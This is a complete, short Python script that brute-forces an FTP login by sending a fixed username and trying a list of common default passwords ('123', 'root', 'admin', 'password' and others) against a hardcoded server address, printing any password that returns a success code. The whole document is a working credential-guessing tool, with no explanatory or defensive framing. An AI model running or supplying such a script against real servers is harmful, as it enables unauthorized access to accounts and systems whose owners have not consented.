#!/usr/bin/python

import socket
import re
import sys

def connect(username, password):
    ftp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ftp.connect(('193.168.1.105', 21))
    response = ftp.recv(1024)
    
    ftp.send(f'USER {username}\r\n'.encode())
    response = ftp.recv(1024)
    
    ftp.send(f'PASS {password}\r\n'.encode())
    response = ftp.recv(1024)
    
    ftp.send(b'QUIT\r\n')
    ftp.close()

    # Check FTP response for successful login (code 230)
    if '230' in response.decode():
        return True
    else:
        return False

username = "SampleName"
passwords = ["123", "ftp", "root", "admin", "test", "backup", "password"]

for password in passwords:
    if connect(username, password):
        print(f"[*] Password found: {password}")
        sys.exit(0)

print("[!] Password not found.")
sys.exit(1)
